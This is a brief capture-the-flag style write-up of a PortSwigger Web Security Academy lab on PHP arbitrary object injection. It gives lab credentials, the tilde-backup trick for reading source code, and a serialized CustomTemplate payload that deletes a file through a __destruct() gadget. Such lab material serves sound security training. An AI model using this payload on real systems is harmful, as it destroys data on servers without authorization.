## Arbitrary object injection in PHP

**Category:** deserialization
**Difficulty:** Unknown

### Description
This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete themorale.txtfile from Carlos's home directory. You will need to obtain source code access to solve this lab.

### Solution Steps
You can sometimes read source code by appending a tilde (
~)
to a filename to retrieve an editor-generated backup file.

### Key Payloads
- `morale.txt`
- `wiener:peter`
- `/libs/CustomTemplate.php`
- `CustomTemplate`
- `__destruct()`
- `unlink()`
- `lock_file_path`
- `/home/carlos/morale.txt`
- `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

### Indicators of Success
- Serialized payload processed without error
- Code execution via gadget chain
- File created/deleted on server
- Out-of-band callback received
- Server behavior indicates deserialization
---
*Source: PortSwigger Web Security Academy*
